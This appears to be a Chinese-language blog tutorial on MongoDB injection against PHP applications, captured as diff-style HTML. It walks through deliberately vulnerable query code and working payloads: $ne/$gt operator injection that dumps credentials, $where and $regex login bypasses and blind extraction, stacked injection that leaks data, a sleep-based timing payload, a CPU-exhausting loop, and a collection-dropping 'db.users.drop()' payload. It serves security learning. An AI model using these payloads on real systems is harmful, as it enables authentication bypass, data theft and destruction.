+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'username: '</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'password: '</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'用户不存在'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span>
+Copy</code></pre>
+
+<p>与旧版写法二类似。</p>
+<h3 id="新版写法三"><a href="#新版写法三" class="headerlink" title="新版写法三"></a><strong>新版写法三</strong></h3><p>还有人喜欢用 <code>Command</code> 去实现 Mongo 的 <code>distinct</code> 方法。举例如下：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$manager</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Command</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
+<span class="token string single-quoted-string">'eval'</span><span class="token operator">=></span> <span class="token string double-quoted-string">"db.users.distinct('uname', &#123;uname: '"</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string double-quoted-string">"', pwd: '"</span><span class="token operator">.</span><span class="token variable">$pwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"'&#125;)"</span>
+<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"db.users.distinct('uname', &#123;uname: '"</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string double-quoted-string">"', pwd: '"</span><span class="token operator">.</span><span class="token variable">$pwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"'&#125;)"</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-></span><span class="token function">executeCommand</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sec_test'</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span> <span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'retval'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$count</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$user</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token variable">$user</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'username: '</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'password: '</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'用户不存在'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span>
+Copy</code></pre>
+
+<p>这个类似旧的写法三。</p>
+<p>接下来按照写法的不同，分别介绍注入的手段。<br>以下内容均以这个数据库为例：</p>
+<pre class="language-mariadb" data-language="mariadb"><code class="language-mariadb">&gt; d.find()
+&#123; &quot;_id&quot; : ObjectId(&quot;5cc196960bc6687b80b15028&quot;), &quot;id&quot; : 1, &quot;uname&quot; : &quot;admin&quot;, &quot;pwd&quot; : &quot;admin&quot; &#125;
+&#123; &quot;_id&quot; : ObjectId(&quot;5cc196a30bc6687b80b15029&quot;), &quot;id&quot; : 2, &quot;uname&quot; : &quot;admin123&quot;, &quot;pwd&quot; : &quot;123456&quot; &#125;
+&#123; &quot;_id&quot; : ObjectId(&quot;5cc196af0bc6687b80b1502a&quot;), &quot;id&quot; : 3, &quot;uname&quot; : &quot;root&quot;, &quot;pwd&quot; : &quot;toor&quot; &#125;</code></pre>
+
+<h2 id="旧版写法一与新版写法一"><a href="#旧版写法一与新版写法一" class="headerlink" title="旧版写法一与新版写法一"></a>旧版写法一与新版写法一</h2><p>这两者注入的方式很类似，放在一起说，以新版的为例。<br>由于参数是数组，不是直接拼接字符串，也就意味着无法破坏原有语句。在这种情况下，只有一种类型注入的方式：<code>二维数组注入</code>（这个名字是我瞎编的）。</p>
+<h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><p>常规注入记有回显。可以接受这样的请求并且将查询的结果打印出来：</p>
+<pre class="language-shell" data-language="shell"><code class="language-shell">» curl &quot;192.168.26.173&#x2F;?username&#x3D;admin&amp;password&#x3D;admin&quot;
+username: admin
+password: admin
+Copy</code></pre>
+
+<p>这个请求映射到数据库里的语句是类似这样的：</p>
+<pre class="language-mariadb" data-language="mariadb"><code class="language-mariadb">db.users.find(&#123;username: &#39;admin&#39;, password: &#39;admin&#39;&#125;);
+Copy</code></pre>
+
+<p>很明显我们可控的点为这两个<code>&#39;admin&#39;</code>。</p>
+<p>之前说过，试图逃逸单引号是不会成功的：</p>
+<pre class="language-shell" data-language="shell"><code class="language-shell">» curl &quot;192.168.26.173&#x2F;?username&#x3D;admin&#39;&amp;password&#x3D;admin&quot;
+未找到
+Copy</code></pre>
+
+<p>但是我们可以这样：</p>
+<pre class="language-mariadb" data-language="mariadb"><code class="language-mariadb">db.users.find(&#123;username: &#123;&#39;$ne&#39;: &#39;&#39;&#125;, password: &#123;&#39;$ne&#39;: &#39;&#39;&#125;&#125;);
+Copy</code></pre>
+
+<p>那么怎么让原来的<code>&#39;admin&#39;</code>变为<code>&#123;&#39;$ne&#39;: &#39;&#39;&#125;</code>呢？这个语句对应到 PHP 那边的 payload 就是二维数组：</p>
+<pre class="language-shell" data-language="shell"><code class="language-shell">» curl &#39;http:&#x2F;&#x2F;192.168.26.173&#x2F;?username\[$ne\]&#x3D;&amp;password\[$ne\]&#x3D;&#39;
+username: admin
+password: admin
+username: admin123
+password: admin123
+username: root
+password: toor
+Copy</code></pre>
+
+<p>利用此特性，我们可以传入数据，是数组的键名为一个操作符（大于：<code>$gt</code>，小于：<code>$lt</code> 等等），完成一些我们想要的查询语句。</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>回想一想上面的例子，假如页面不会把数据打印出来呢？只是告诉你成功或者失败，那么就是我们在 MySQL 里遇到的布尔盲注了。布尔盲注重点在于怎么逐个提取字符，MySQL 里我们可以采用<code>substr</code>，而在 MongoDB 里我们有 <code>$regex</code>。</p>
+<p>示例：</p>
+<pre class="language-mariadb" data-language="mariadb"><code class="language-mariadb">db.users.find(&#123;username: &#123;&#39;$regex&#39;: &#39;^a&#39;&#125;, password: &#123;&#39;$ne&#39;: &#39;&#39;&#125;&#125;); &#x2F;&#x2F; 猜解第一个字符
+
+db.users.find(&#123;username: &#123;&#39;$regex&#39;: &#39;^ad&#39;&#125;, password: &#123;&#39;$ne&#39;: &#39;&#39;&#125;&#125;); &#x2F;&#x2F; 猜解第一个字符
+
+db.users.find(&#123;username: &#123;&#39;$regex&#39;: &#39;^adm&#39;&#125;, password: &#123;&#39;$ne&#39;: &#39;&#39;&#125;&#125;); &#x2F;&#x2F; 猜解第一个字符
+
+db.users.find(&#123;username: &#123;&#39;$regex&#39;: &#39;^admi&#39;&#125;, password: &#123;&#39;$ne&#39;: &#39;&#39;&#125;&#125;); &#x2F;&#x2F; 猜解第一个字符
+
+db.users.find(&#123;username: &#123;&#39;$regex&#39;: &#39;^admin&#39;&#125;, password: &#123;&#39;$ne&#39;: &#39;&#39;&#125;&#125;); &#x2F;&#x2F; 猜解第一个字符
+...
+Copy</code></pre>
+
+<p><strong>正则表达式玩的 6，MongoDB 注入没烦恼</strong> (狗头)</p>
+<h2 id="旧版写法二与新版写法二"><a href="#旧版写法二与新版写法二" class="headerlink" title="旧版写法二与新版写法二"></a>旧版写法二与新版写法二</h2><p><code>$where</code> 操作符是可以执行 JavaScript 语句的。如果版本在 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令可以访问到 MongoDB shell 中的全局函数和属性，如 db。也就是说可以在自定义的函数里获取数据库的所有信息。</p>
+<h3 id="常规-1"><a href="#常规-1" class="headerlink" title="常规"></a>常规</h3><p>由于存在回显，我们可以通过 <code>return</code> 来返回任意的数据。</p>
+<blockquote>
+<p>如果 <code>db</code> 能用</p>
+</blockquote>
+<p>有 2 类 payload：</p>
+<ul>
+<li><p>所有的数据库名</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'||1) return &#123;'username': tojson(db.getCollectionNames()), 'password': 'hacked'&#125;&#125;//"</span>
+<span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"anything"</span>
+Copy</code></pre>
+
+<p>相当于</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$function</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"function() &#123;if(this.uname == ''||1) return &#123;'username': tojson(db.getCollectionNames()), 'password': 'hacked'&#125;&#125;//' &amp;&amp; this.pwd == 'anything') return &#123;'username': this.uname, 'password': this.pwd&#125;&#125;"</span><span class="token punctuation">;</span>
+Copy</code></pre></li>
+<li><p>其他<br>类似的 payload 还有很多，毕竟<code>db</code>能用的函数非常多</p>
+</li>
+</ul>
+<p>另一类的 payload 和 👇 一样</p>
+<blockquote>
+<p>如果 <code>db</code> 不能用</p>
+</blockquote>
+<p>这类 payload 就是使得 <code>if</code> 永真：</p>
+<ul>
+<li><p>数据库里的所有数据（也可以当做万能密码使用）</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"anything"</span>
+<span class="token variable">$pwd</span><span class="token operator">=</span><span class="token string double-quoted-string">"admin' || '' == '"</span>
+Copy</code></pre>
+
+<p>相当于</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$function</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"function() &#123;if(this.uname == 'anything' &amp;&amp; this.pwd == 'admin' || '' == '') return &#123;'username': this.uname, 'password': this.pwd&#125;&#125;"</span><span class="token punctuation">;</span>
+Copy</code></pre>
+
+<p>应该就这一个利用场景</p>
+</li>
+</ul>
+<h3 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>如果页面没有回显，只有类似<code>成功/失败</code>，那么就只能用布尔盲注。</p>
+<blockquote>
+<p>如果 <code>db</code> 能用：</p>
+</blockquote>
+<ul>
+<li><p>获取所有数据库的数量：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'||db.getCollectionNames().length>0&amp;&amp;'1'=='1"</span>
+Copy</code></pre>
+
+<p>相当于</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$function</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"function q() &#123;if(this.uname == '' &amp;&amp; db.getCollectionNames().length > 0 &amp;&amp; '1' == '1') return true &#125;"</span><span class="token punctuation">;</span>
+Copy</code></pre>
+
+<p>这样慢慢地去判断。</p>
+</li>
+<li><p>其他<br>类似的 payload 还有很多，毕竟<code>db</code>能用的函数非常多</p>
+</li>
+</ul>
+<blockquote>
+<p>如果 <code>db</code> 不能用</p>
+</blockquote>
+<ul>
+<li><p>万能密码：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"anything"</span>
+<span class="token variable">$pwd</span><span class="token operator">=</span><span class="token string double-quoted-string">"admin' || '' == '"</span>
+Copy</code></pre>
+
+<p>相当于</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$function</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"function q() &#123;if(this.uname == 'anything' &amp;&amp; this.pwd == 'admin' || '' == '') return true&#125;"</span><span class="token punctuation">;</span>
+Copy</code></pre>
+
+<p>应该只有这一个利用场景。</p>
+</li>
+</ul>
+<p>最后，写法二还有一个好玩的 payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"')&#123;&#125;else&#123;var date = new Date(); do&#123;curDate = new Date();&#125;while(curDate-date&lt;10000);&#125;&#125;)//"</span>
+<span class="token variable">$pwd</span><span class="token operator">=</span><span class="token string double-quoted-string">"admin' || '' == '"</span>
+Copy</code></pre>
+
+<p>相当于</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$function</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"function q() &#123;if(this.uname == '')&#123;&#125;else&#123;var date = new Date(); do&#123;curDate = new Date();&#125;while(curDate-date&lt;10000);&#125;&#125;)//' &amp;&amp; this.pwd == 'anything') return true&#125;"</span><span class="token punctuation">;</span>
+Copy</code></pre>
+
+<p>利用循环将 cpu 使用率飙升至 100%，持续 10000 ms</p>
+<h2 id="旧版写法三与新版写法三"><a href="#旧版写法三与新版写法三" class="headerlink" title="旧版写法三与新版写法三"></a>旧版写法三与新版写法三</h2><p>直接将输入拼接到查询语句里，是很不妥的写法，一旦过滤出现问题，危害很大。</p>
+<h3 id="常规-2"><a href="#常规-2" class="headerlink" title="常规"></a>常规</h3><p>老样子，先通过逃逸引号的方式破坏原语句，再插入恶意语句，最后闭合剩下的原有语句：</p>
+<ul>
+<li><p>万能密码</p>
+<p>payload:</p>
+<pre class="language-php" data-language="php"><code class="language-php">user <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>
+pwd <span class="token operator">=</span> <span class="token string double-quoted-string">"anything"</span>
+Copy</code></pre></li>
+</ul>
+<h3 id="布尔盲注-2"><a href="#布尔盲注-2" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>和之前<code>旧版写法一与新版写法一</code>中的布尔盲注一样，也是利用<code>$regex</code>逐个拿字符。</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>MongoDB 语句以<code>;</code>为分割。以 PHP 为例，由于 <code>execute</code> 支持多语句执行，所以可以闭合原语句后利用<code>;</code>在后面拼接任意新的语句，达到执行任意语句的效果。相当于有了 MongoDB shell，<code>db</code> 是可以随意使用的，能做的事情非常多。注意，较高版本的堆叠注入用不了注释<code>//</code></p>
+<ul>
+<li><p>万能密码</p>
+<p>payload:</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin', <span class="token interpolation"><span class="token variable">$where</span></span>: "</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string double-quoted-string">"
+<span class="token interpolation"><span class="token variable">$pwd</span></span> = "</span><span class="token punctuation">&#125;</span><span class="token string double-quoted-string">", uname:'admin"</span>
+Copy</code></pre>
+
+<p>效果如下：</p>
+<pre class="language-mariadb" data-language="mariadb"><code class="language-mariadb">db.users.distinct(&#39;uname&#39;, &#123;uname: &#39;admin&#39;, $where: &quot;function()&#123;return &#39;, pwd: &#39;&#125;&quot;, uname:&#39;admin&#39;&#125;)
+Copy</code></pre>
+
+<p>或者</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin', <span class="token interpolation"><span class="token variable">$or</span></span>: [&#123;"</span>
+<span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">": <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ne</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">&#125;</span></span>&#125;,&#123;&#125;], uname:'admin"</span>
+Copy</code></pre>
+
+<p>效果如下：</p>
+<pre class="language-mariadb" data-language="mariadb"><code class="language-mariadb">db.users.distinct(&#39;uname&#39;, &#123;uname: &#39;admin&#39;, $or: [&#123;&#39;, pwd: &#39;: &#123;$ne: &#39;&#39;&#125;&#125;,&#123;&#125;], uname:&#39;admin&#39;&#125;)
+Copy</code></pre></li>
+<li><p>还可以把数据直接带出来：</p>
+<p>payload:</p>
+<pre class="language-php" data-language="php"><code class="language-php">username <span class="token operator">=</span> <span class="token string double-quoted-string">"'&#125;); return [&#123;uname: tojson(db.getCollectionNames()), pwd: 2&#125;]; var a=(&#123;'a': "</span>
+password <span class="token operator">=</span> <span class="token string double-quoted-string">"+'"</span>
+Copy</code></pre>
+
+<p>效果如下：</p>
+<pre class="language-mariadb" data-language="mariadb"><code class="language-mariadb">db.users.distinct(&#39;uname&#39;, &#123;uname: &#39;&#39;&#125;); return [&#123;uname: tojson(db.getName()), pwd: 2&#125;]; var a&#x3D;(&#123;&#39;a&#39;: &#39;, pwd: &#39;+&#39;&#39;&#125;)
+Copy</code></pre>
+
+<p>此时返回的数据就为</p>
+<pre class="language-none"><code class="language-none">&#123;uname: &quot;sec_test&quot;, pwd: 2&#125;</code></pre>
+
+<p>，可以拿到数据库名。利用这个办法，可以拿到很多数据：</p>
+<ul>
+<li>所有数据库：<code>&#123;uname: tojson(db.getCollectionNames()), pwd: 2&#125;</code></li>
+<li>MongoDB 版本：<code>&#123;uname: tojson(db.version()), pwd: 2&#125;</code></li>
+<li>表<code>users</code>的第一条数据：<code>&#123;uname: tojson(db.users.find()[0]), pwd: 2&#125;;</code></li>
+</ul>
+</li>
+<li><p>时间盲注：</p>
+<p>payload:</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"anything'&#125;);if (db.version() > "</span><span class="token number">0</span><span class="token string double-quoted-string">") &#123; sleep(1000) &#125;var b=(&#123;a:'1"</span>
+<span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"anything"</span>
+Copy</code></pre>
+
+<p>效果如下：</p>
+<pre class="language-mariadb" data-language="mariadb"><code class="language-mariadb">db.test.find(&#123;uname:&#39;anything&#39;&#125;);if (db.version() &gt; &quot;0&quot;) &#123; sleep(1000) &#125;var b&#x3D;(&#123;a:&#39;1&#39;, pwd:&#39;anything&#39;&#125;);
+Copy</code></pre></li>
+<li><p>其他：</p>
+<p>上辈子一定是仇人系列：</p>
+<pre class="language-php" data-language="php"><code class="language-php">username <span class="token operator">=</span> <span class="token string double-quoted-string">"'&#125;); db.users.drop(); var a=(&#123;'a': "</span>
+password <span class="token operator">=</span> <span class="token string double-quoted-string">"+'"</span>
+Copy</code></pre>
+
+<p>插入等等语句均可。</p>
+</li>
+</ul>
+<h2 id="注入的方法（汇总）"><a href="#注入的方法（汇总）" class="headerlink" title="注入的方法（汇总）"></a>注入的方法（汇总）</h2><p><strong>1、重言式</strong></p>
+<p>又称为永真式（这个好像是数理逻辑里面的术语），此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
+<p><strong>2、联合查询</strong></p>
+<p>联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
+<p><strong>3、JavaScript 注入</strong></p>
+<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，传递不干净的用户输入到这些查询中可以注入任意 JavaScript 代码，导致非法的数据获取或篡改。</p>
+<p><strong>4、盲注</strong></p>
+<p>当页面没有回显时，那么我们可以通过<code>$regex</code>正则表达式来达到和 SQL 注入中<code>substr()</code>函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
+<p>下面，我们就主要通过 PHP 来讲解一下 MongoDB 注入的利用方式，其他语言手法是类似的。</p>
+<h2 id="注入示例"><a href="#注入示例" class="headerlink" title="注入示例"></a>注入示例</h2><h3 id="重言式注入"><a href="#重言式注入" class="headerlink" title="重言式注入"></a><strong>重言式注入</strong></h3><p>利用<code>executeQuery</code>直接查询：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment"># 连接数据库</span>
+<span class="token variable">$manager</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"mongodb://localhost:27017"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token comment"># 查询语句</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span>
+    <span class="token string single-quoted-string">'uname'</span> <span class="token operator">=></span> <span class="token variable">$uname</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'pwd'</span> <span class="token operator">=></span> <span class="token variable">$pwd</span>
+<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment"># 执行语句</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.users'</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$count</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'username:'</span> <span class="token operator">.</span> <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'password:'</span> <span class="token operator">.</span> <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Not Found'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span></code></pre>
+
+<p>传递的参数是一个数组，比较安全。这种形式叫 <code>ODM</code>，它会帮你过滤数据，所以一般不用担心原语句被破坏。</p>
+<blockquote>
+<p><code>ORM</code> 对应关系型数据库，如 MySQL；<code>ODM</code> 对应文档型数据库，如 MongoDB。</p>
+</blockquote>
+<p>当我们用公共用户 ca01h 输入时，显示出 username 和 password：这是一个正常的输入</p>
+<p>PHP 允许最终用户通过将 URL 参数更改为带有方括号的参数来将 GET 查询字符串输入更改为数组，我们试一下这种输入：<code>test.php?username[$ne]=1&amp;password[$ne]=1</code>,所有用户都查出来了，再看一下数据处理过程：</p>
+<p><img src="C:\Users\Yty\AppData\Roaming\Typora\typora-user-images\image-20211125181250405.png" alt="image-20211125181250405"></p>
+<p>对于 PHP 本身的特性而言，由于其松散的数组特性，导致如果我们输入<code>value=1</code>那么，也就是输入了一个 value 的值为 1 的数据。如果输入<code>value[$ne]=1</code>也就意味着<code>value=array($ne=&gt;1)</code>,在 MongoDB 中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用<code>username[$gt]=&amp;password[$gt]=</code>作为 payload 进行攻击。</p>
+<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a><strong>联合查询注入</strong></h3><p>我们都知道在 SQL 时代拼接字符串容易造成 SQL 注入，NoSQL 也有类似问题，但是现在无论是 PHP 的 MongoDB driver 还是 node.js 的 mongoose 都必须要求查询条件必须是一个数组或者 query 对象了，因此简单看一下就好。</p>
+<p>示例代码：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">string</span> query <span class="token operator">=</span><span class="token string double-quoted-string">"&#123; username: '"</span> <span class="token operator">+</span> <span class="token variable">$username</span> <span class="token operator">+</span> <span class="token string double-quoted-string">"', password: '"</span> <span class="token operator">+</span> <span class="token variable">$password</span> <span class="token operator">+</span> <span class="token string double-quoted-string">"' &#125;"</span></code></pre>
+
+<p>Payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span>admin<span class="token string single-quoted-string">', $or: [ &#123;&#125;, &#123;'</span>a<span class="token string single-quoted-string">': '</span>a<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token string single-quoted-string">' &#125;], $comment: '</span>successful MongoDB injection'</code></pre>
+
+<p>相当于执行了：</p>
+<pre class="language-mariadb" data-language="mariadb"><code class="language-mariadb">&#123; username: &#39;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;:&#39;a&#39;, password: &#39;&#39; &#125;], $comment: &#39;successful MongoDB injection&#39;</code></pre>
+
+<p>这种手法和 SQL 注入比较相似：</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">select * from logins where username &#x3D; &#39;admin&#39; and (password true&lt;&gt; or (&#39;a&#39;&#x3D;&#39;a&#39; and password &#x3D; &#39;&#39;))</code></pre>
+
+<h3 id="JavaScript-注入"><a href="#JavaScript-注入" class="headerlink" title="JavaScript 注入"></a><strong>JavaScript 注入</strong></h3><p>我们知道 MongDB Server 是支持 JavaScript 语言的，这样给开发人员带来了很多非常方便的使用方法，但也是因为它本身的灵活性，造成了 JavaScript 注入。</p>
